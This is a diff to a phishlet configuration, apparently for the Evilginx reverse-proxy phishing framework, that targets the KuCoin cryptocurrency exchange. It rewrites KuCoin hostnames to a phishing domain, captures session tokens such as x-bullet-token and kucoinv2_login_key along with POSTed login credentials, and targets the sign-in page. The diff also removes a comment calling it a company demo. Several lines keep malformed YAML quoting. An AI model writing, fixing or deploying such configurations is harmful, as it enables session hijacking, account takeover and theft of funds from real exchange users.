@@ -22,9 +22,9 @@ proxy_hosts:
   - { phish_sub: 'assets-v2', orig_sub: 'assets-v2', domain: 'kucoin.com', session: true, is_landing: false, auto_filter: true}
           
 sub_filters: 
-  - { triggers_on: 'passport.kucoin.com', orig_subs: 'passport', domain: 'kucoin.com', search: 'https://{hostname_regexp}/', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']} 
-  - { Triggers_on: 'api.kucoin.com', orig_subs: 'api', domain: 'kucoin.com', search: 'https://{hostname_regexp}/', replace: '{hostname}', mimes: [text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']}
-  - { Triggers_on: 'www.kucoin.com', orig_subs: 'www', domain: 'kucoin.com', search: 'https://{hostname_regexp}/', replace: '{hostname}', mimes: [text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']}
+  - { triggers_on: 'passport.kucoin.com', orig_sub: 'passport', domain: 'kucoin.com', search: 'https://{hostname_regexp}/', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']} 
+  - { Triggers_on: 'api.kucoin.com', orig_sub: 'api', domain: 'kucoin.com', search: 'https://{hostname_regexp}/', replace: '{hostname}', mimes: [text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']}
+  - { Triggers_on: 'www.kucoin.com', orig_sub: 'www', domain: 'kucoin.com', search: 'https://{hostname_regexp}/', replace: '{hostname}', mimes: [text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']}
 auth_tokens:
   - domain: 'kucoin.com'
     keys: ['x-bullet-token, kucoinv2_bulletTokenKeyPrivate, kucoinv2_bulletTokenUidKey, kucoinv2_clientId, kucoinv2_login_key']
@@ -39,10 +39,6 @@ credentials:
     search: '(.*)'
     type: 'post'
 
-
 login:
-  username: user
-  password: pass
-  url: https://www.kucoin.com/ucenter/signin
-
-# This is a demo example of a phishlet for 3.0 for my company Rencora
+  domain: 'www.kucoin.com'
+  path: '/ucenter/signin'
